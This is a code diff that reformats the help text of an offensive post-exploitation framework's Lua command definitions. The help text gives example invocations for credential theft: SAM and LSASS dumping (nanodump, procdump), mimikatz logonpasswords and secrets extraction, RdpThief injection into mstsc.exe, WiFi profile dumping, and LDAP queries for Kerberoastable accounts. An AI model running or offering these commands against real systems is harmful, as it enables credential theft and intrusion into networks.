@@ -148,13 +148,19 @@ cmd_dump_wifi:Flags():String("profilename", "", "WiFi profile name to dump")
 opsec("wifi:dump", 9.0)
 
 help("wifi:dump", [[
-Positional arguments format:
-  wifi dump "My WiFi Network"
-  wifi dump MyWiFi
+**Positional arguments format:**
 
-Flag format:
-  wifi dump --profilename "My WiFi Network"
-  wifi dump --profilename MyWiFi
+```
+wifi dump "My WiFi Network"
+wifi dump MyWiFi
+```
+
+**Flag format:**
+
+```
+wifi dump --profilename "My WiFi Network"
+wifi dump --profilename MyWiFi
+```
 ]])
 
 -- enum_wifi
@@ -242,16 +248,22 @@ cmd_dump_sam:Flags():String("location", "C:\\Windows\\Temp\\", "folder to save (
 opsec("dump_sam", 9.0)
 
 help("dump_sam", [[
-Positional arguments format:
-  dump_sam                           # Use default location (C:\Windows\Temp\)
-  dump_sam C:\temp\                  # Specify custom location
-  dump_sam "C:\My Folder\"           # Location with spaces
+**Positional arguments format:**
 
-Flag format:
-  dump_sam --location C:\temp\
-  dump_sam --location "C:\My Folder\"
+```
+dump_sam                           # Use default location (C:\Windows\Temp\)
+dump_sam C:\temp\                  # Specify custom location
+dump_sam "C:\My Folder\"           # Location with spaces
+```
 
-Note: Requires administrator privileges
+**Flag format:**
+
+```
+dump_sam --location C:\temp\
+dump_sam --location "C:\My Folder\"
+```
+
+> Requires administrator privileges
 ]])
 
 -- pingscan
@@ -454,15 +466,21 @@ bind_flags_completer(cmd_nslookup, { ["record-type"] = values_completer({"A", "N
 opsec("nslookup", 9.0)
 
 help("nslookup", [[
-Positional arguments format:
-  nslookup www.baidu.com
-  nslookup www.baidu.com 8.8.8.8
-  nslookup www.baidu.com 8.8.8.8 CNAME
+**Positional arguments format:**
 
-Flag format:
-  nslookup --host www.baidu.com
-  nslookup --host www.baidu.com --server 114.114.114.114
-  nslookup --host www.baidu.com --server 114.114.114.114 --record-type MX
+```
+nslookup www.baidu.com
+nslookup www.baidu.com 8.8.8.8
+nslookup www.baidu.com 8.8.8.8 CNAME
+```
+
+**Flag format:**
+
+```
+nslookup --host www.baidu.com
+nslookup --host www.baidu.com --server 114.114.114.114
+nslookup --host www.baidu.com --server 114.114.114.114 --record-type MX
+```
 ]])
 
 -- systeminfo
@@ -737,20 +755,35 @@ cmd_nanodump:Flags():String("chunk-size", "", "chunk size in KB (default: 924)")
 opsec("nanodump", 9.0)
 
 help("nanodump", [[
-Basic LSASS dump:
-  nanodump
+**Basic LSASS dump:**
 
-Write minidump to disk with valid signature:
-  nanodump --valid --write --write-path C:\Windows\Temp\lsass.dmp
+```
+nanodump
+```
 
-Use fork and spoof callstack:
-  nanodump --fork --spoof-callstack
+**Write minidump to disk with valid signature:**
 
-Use shtinkering technique (requires admin):
-  nanodump --shtinkering
+```
+nanodump --valid --write --write-path C:\Windows\Temp\lsass.dmp
+```
 
-Get LSASS PID only:
-  nanodump --getpid
+**Use fork and spoof callstack:**
+
+```
+nanodump --fork --spoof-callstack
+```
+
+**Use shtinkering technique (requires admin):**
+
+```
+nanodump --shtinkering
+```
+
+**Get LSASS PID only:**
+
+```
+nanodump --getpid
+```
 ]])
 
 -- mimikatz
@@ -781,31 +814,38 @@ local cmd_mimikatz = command("mimikatz", run_mimikatz, "Execute mimikatz with sp
 opsec("mimikatz", 7.0)
 
 help("mimikatz", [[
-Positional arguments format:
-  mimikatz coffee
-  mimikatz privilege::debug sekurlsa::logonpasswords
-  mimikatz "privilege::debug" "sekurlsa::logonpasswords"
-  mimikatz privilege::debug sekurlsa::wdigest
-  mimikatz privilege::debug sekurlsa::kerberos
-  mimikatz privilege::debug lsadump::sam
-  mimikatz privilege::debug lsadump::secrets
-  mimikatz kerberos::list
-  mimikatz crypto::capi
-  mimikatz vault::list
+**Positional arguments format:**
 
-Common credential extraction:
-  mimikatz privilege::debug sekurlsa::logonpasswords
-  mimikatz privilege::debug sekurlsa::wdigest
-  mimikatz privilege::debug sekurlsa::kerberos
+```
+mimikatz coffee
+mimikatz privilege::debug sekurlsa::logonpasswords
+mimikatz "privilege::debug" "sekurlsa::logonpasswords"
+```
 
-Registry dumps:
-  mimikatz privilege::debug lsadump::sam
-  mimikatz privilege::debug lsadump::secrets
+**Common credential extraction:**
 
-Note:
-- Most commands require administrator privileges
-- "exit" command is automatically added to prevent hanging
-- No need to manually add "exit" at the end
+```
+mimikatz privilege::debug sekurlsa::logonpasswords
+mimikatz privilege::debug sekurlsa::wdigest
+mimikatz privilege::debug sekurlsa::kerberos
+```
+
+**Registry dumps:**
+
+```
+mimikatz privilege::debug lsadump::sam
+mimikatz privilege::debug lsadump::secrets
+```
+
+**Other commands:**
+
+```
+mimikatz kerberos::list
+mimikatz crypto::capi
+mimikatz vault::list
+```
+
+> Most commands require administrator privileges. "exit" command is automatically appended.
 ]])
 
 -- logonpasswords
@@ -914,35 +954,49 @@ cmd_ldapsearch:Flags():String("domain", "", "Distinguished Name to use (empty fo
 opsec("ldapsearch", 9.0)
 
 help("ldapsearch", [[
-Perform LDAP search with various options:
-  ldapsearch --query "(&(objectClass=user)(samAccountName=admin*))"
-  ldapsearch --query "(&(objectClass=computer))" --attributes "name,operatingSystem" --result-count 10
+**Flag format:**
 
-Positional arguments format:
-  ldapsearch "(&(objectClass=user))" "" 0 "" ""
-  ldapsearch "(&(objectClass=computer))" "name,operatingSystem" 10 "dc01.domain.com" "DC=domain,DC=com"
+```
+ldapsearch --query "(&(objectClass=user)(samAccountName=admin*))"
+ldapsearch --query "(&(objectClass=computer))" --attributes "name,operatingSystem" --result-count 10
+```
 
-Useful queries (edit for OPSEC safety):
+**Positional arguments format:**
+
+```
+ldapsearch "(&(objectClass=user))" "" 0 "" ""
+ldapsearch "(&(objectClass=computer))" "name,operatingSystem" 10 "dc01.domain.com" "DC=domain,DC=com"
+```
+
+**Useful queries:**
 
 Kerberoastable accounts:
-  ldapsearch "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
+
+```
+ldapsearch "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))"
+```
 
 AS-REP Roastable accounts:
-  ldapsearch "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+
+```
+ldapsearch "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+```
 
 Passwords with reversible encryption:
-  ldapsearch "(&(objectClass=user)(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128))"
 
-For Bloodhound ACL data, add nTSecurityDescriptor:
-  ldapsearch "(&(objectClass=user))" "*,ntsecuritydescriptor"
+```
+ldapsearch "(&(objectClass=user)(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=128))"
+```
 
-Defaults:
-- Empty attributes = get all attributes
-- 0 result_count = get all results
-- Empty hostname = use Primary DC
-- Empty domain = use Base domain Level
+For Bloodhound ACL data:
 
-Note: If paging fails, consider using nonpagedldapsearch instead
+```
+ldapsearch "(&(objectClass=user))" "*,ntsecuritydescriptor"
+```
+
+**Defaults:** Empty attributes = all, 0 result_count = all, empty hostname = Primary DC, empty domain = Base domain.
+
+> If paging fails, consider using nonpagedldapsearch instead.
 ]])
 
 -- procdump
@@ -962,8 +1016,11 @@ cmd_procdump:Flags():String("output_path", "C:\\Windows\\Temp\\procdump.dmp", "o
 opsec("procdump", 9.0)
 
 help("procdump", [[
-Dump a process memory:
-  procdump --pid 1234 --output-path C:\Windows\Temp\procdump.dmp
+**Dump a process memory:**
+
+```
+procdump --pid 1234 --output-path C:\Windows\Temp\procdump.dmp
+```
 ]])
 
 -- ExecuteCrossSession
@@ -1032,20 +1089,23 @@ opsec("rdpthief:inject", 8.5)
 help("rdpthief:inject", [[
 Manually inject RdpThief DLL into a specific mstsc.exe process.
 
-Positional format:
-  rdpthief inject 1234
+**Positional format:**
 
-Flag format:
-  rdpthief inject --pid 1234
+```
+rdpthief inject 1234
+```
 
-Steps to use:
-1. Find mstsc.exe process: ps | grep mstsc
-2. Inject into the PID: rdpthief inject <pid>
+**Flag format:**
+
+```
+rdpthief inject --pid 1234
+```
+
+**Steps to use:**
+
+1. Find mstsc.exe process: `ps | grep mstsc`
+2. Inject into the PID: `rdpthief inject <pid>`
 3. Wait for user to enter credentials
 
-Note:
-- Only supports x64 architecture
-- Target must be mstsc.exe process
-- Credentials are logged to %TEMP%\data.bin
-- High OPSEC risk (8.5) - active credential theft
+> Only supports x64 architecture. Target must be mstsc.exe process. Credentials are logged to %TEMP%\data.bin.
 ]])
